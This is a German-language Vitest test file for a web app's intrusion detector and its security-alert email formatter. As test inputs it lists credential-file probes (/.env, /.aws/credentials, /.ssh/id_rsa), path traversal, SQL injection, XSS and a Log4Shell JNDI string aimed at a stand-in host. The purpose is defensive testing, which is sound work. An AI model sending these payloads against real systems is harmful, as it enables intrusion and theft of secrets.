import { describe, expect, it } from "vitest";
import { readdirSync, statSync } from "node:fs";
import { join } from "node:path";
import { pruefeAnfrage } from "./signaturen";
import { sicherheitsMailText } from "./mail";
import { APP_ROUTES, OTHER_APP_ROUTES } from "@/lib/app-routes";
import { MARKETING_ROUTES, OTHER_PUBLIC_ROUTES, PUBLIC_API_ROUTES } from "@/lib/public-routes";
const BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36";
function oeffentlicheDateien(dir = "public", basis = ""): string[] {
    return readdirSync(dir).flatMap(name => {
        const voll = join(dir, name);
        const pfad = `${basis}/${name}`;
        return statSync(voll).isDirectory() ? oeffentlicheDateien(voll, pfad) : [pfad];
    });
}
describe("pruefeAnfrage — echte Seiten bleiben unberührt", () => {
    const echte = [
        "/", "/login", "/register", "/admin", "/impressum", "/datenschutz", "/robots.txt", "/sitemap.xml",
        "/llms.txt", "/manifest.webmanifest", "/sw.js", "/.well-known/security.txt",
        "/api/health", "/api/track", "/api/sicherheit/anmeldung", "/api/admin/sicherheit",
        ...APP_ROUTES, ...OTHER_APP_ROUTES, ...MARKETING_ROUTES, ...OTHER_PUBLIC_ROUTES, ...PUBLIC_API_ROUTES,
        ...oeffentlicheDateien(),
    ];
    it.each(echte.map(p => [p]))("%s", pfad => {
        expect(pruefeAnfrage({ pfad, userAgent: BROWSER })).toBeNull();
    });
    it("normale Suchparameter", () => {
        expect(pruefeAnfrage({ pfad: "/login", abfrage: "?redirect=%2Fdienstplan%3Fwoche%3D42", userAgent: BROWSER })).toBeNull();
        expect(pruefeAnfrage({ pfad: "/ratgeber", abfrage: "?q=Dienstplan+oder+Schichtplan", userAgent: BROWSER })).toBeNull();
    });
    it("Suchmaschinen und Antwortmaschinen", () => {
        for (const ua of ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "ClaudeBot/1.0", "python-httpx/0.27.0", "vercel-cron/1.0"]) {
            expect(pruefeAnfrage({ pfad: "/", userAgent: ua })).toBeNull();
        }
    });
    it("Cron mit Schlüssel", () => {
        expect(pruefeAnfrage({ pfad: "/api/cron/auto-schedule", userAgent: "vercel-cron/1.0", hatAutorisierung: true })).toBeNull();
    });
});
describe("pruefeAnfrage — Angriffe", () => {
    it.each([
        ["/.env"], ["/.env.local"], ["/app/.env"], ["/.git/config"], ["/.git/HEAD"], ["/.aws/credentials"],
        ["/wp-config.php"], ["/%2e%2e/%2e%2e/etc/passwd"], ["/.ssh/id_rsa"],
    ])("%s sperrt sofort", pfad => {
        const b = pruefeAnfrage({ pfad, userAgent: BROWSER });
        expect(b?.schwere).toBe("kritisch");
        expect(b?.punkte).toBeGreaterThanOrEqual(20);
    });
    it.each([
        ["?id=1 UNION SELECT password FROM users", "sql_injection"],
        ["?q=' or 1=1--", "sql_injection"],
        ["?q=<script>alert(1)</script>", "xss"],
        ["?x=${jndi:ldap://evil/a}", "log4shell"],
        ["?f=../../etc/hosts", "pfad_traversal"],
    ])("Abfrage %s → %s", (abfrage, art) => {
        expect(pruefeAnfrage({ pfad: "/", abfrage, userAgent: BROWSER })?.art).toBe(art);
    });
    it.each([
        ["/wp-login.php"], ["/xmlrpc.php"], ["/phpmyadmin/"], ["/cgi-bin/luci"], ["/actuator/health"],
        ["/backup.zip"], ["/dump.sql"], ["/api/session/properties"], ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"],
    ])("%s ist Schwachstellen-Suche", pfad => {
        const b = pruefeAnfrage({ pfad, userAgent: BROWSER });
        expect(b).not.toBeNull();
        expect(b!.punkte).toBeLessThan(20);
    });
    it("der Scanner vom 17.10.2026", () => {
        const b = pruefeAnfrage({ pfad: "/", userAgent: "metabase-cve-2026-72898-detect/1.0 (benign detection probes only)" });
        expect(b?.art).toBe("scanner");
    });
    it("bekannte Werkzeuge", () => {
        for (const ua of ["sqlmap/1.8", "Mozilla/5.0 (compatible; Nuclei - Open-source project)", "Nikto/2.5.0", "WPScan v3.8"]) {
            expect(pruefeAnfrage({ pfad: "/", userAgent: ua })?.art).toBe("scanner");
        }
    });
    it("Cron ohne Schlüssel wird festgehalten", () => {
        expect(pruefeAnfrage({ pfad: "/api/cron/auto-schedule", userAgent: "curl/8" })?.art).toBe("cron_unbefugt");
    });
    it("/_next/ ist nie verdächtig", () => {
        expect(pruefeAnfrage({ pfad: "/_next/static/chunks/app.js.bak", userAgent: BROWSER })).toBeNull();
    });
});
describe("sicherheitsMailText", () => {
    it("maskiert, was der Angreifer bestimmt", () => {
        const { subject, html } = sicherheitsMailText({
            ip: "203.0.113.7", land: "VN", region: null, stadt: "Hanoi",
            userAgent: "<img src=x onerror=alert(1)>", art: "scanner_pfad", schwere: "warnung",
            grund: "Pfad einer fremden Software", methode: "GET", pfad: "/wp-login.php?<b>",
            details: { konto: "a@b.de" }, punkte: 25, gesperrtBis: "2026-10-18T18:00:00.000Z",
        });
        expect(subject).toContain("203.0.113.7 automatisch gesperrt");
        expect(html).not.toContain("<img src=x");
        expect(html).toContain("&lt;img");
        expect(html).toContain("Hanoi, VN");
        expect(html).toContain("a@b.de");
        expect(html).toContain("abuseipdb.com/check/203.0.113.7");
    });
    it("nennt die angegriffene Einrichtung im Betreff und ganz oben", () => {
        const { subject, html } = sicherheitsMailText({
            ip: "203.0.113.7", land: "VN", region: null, stadt: null, userAgent: null,
            art: "login_fehlgeschlagen", schwere: "info", grund: "Anmeldung fehlgeschlagen",
            methode: "POST", pfad: "/login",
            details: { konto: "a@praxis.de", einrichtung: "Praxis Dr. Muster", stufe: "passwort" },
            punkte: 20, gesperrtBis: "2026-10-19T08:00:00.000Z",
        });
        expect(subject).toContain("Praxis Dr. Muster");
        expect(html.indexOf(">Angegriffene Einrichtung<")).toBeLessThan(html.indexOf(">IP-Adresse<"));
        expect(html).toContain("Angegriffenes Konto");
        expect(html.split("Empfehlung (automatisch)")[0].match(/Praxis Dr\. Muster/g)).toHaveLength(1);
    });
});
